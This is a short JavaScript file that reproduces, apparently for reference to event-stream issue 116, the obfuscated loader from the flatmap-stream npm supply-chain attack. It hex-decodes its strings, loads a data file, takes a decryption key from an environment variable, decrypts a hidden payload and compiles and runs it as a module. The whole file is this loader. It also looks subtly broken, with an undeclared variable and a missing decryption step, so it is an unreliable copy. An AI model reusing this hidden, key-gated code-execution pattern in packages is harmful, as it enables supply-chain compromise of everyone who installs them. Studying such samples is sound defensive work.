// Based on https://github.com/dominictarr/event-stream/issues/116

var r = require, t = process;

function e(r) {
  return Buffer.from(r, "hex").toString()
}

var n = r(e("2e2f746573742f64617461")),
    o = t[e(n[3])][e(n[4])];

if (!o) return;

var u = r(e(n[2]))[e(n[6])](e(n[5]), o);
a += u.final(e(n[9]));

var f = new module.constructor;
f.paths = module.paths; 
f[e(n[7])](a, "");
f.exports(n[1]);
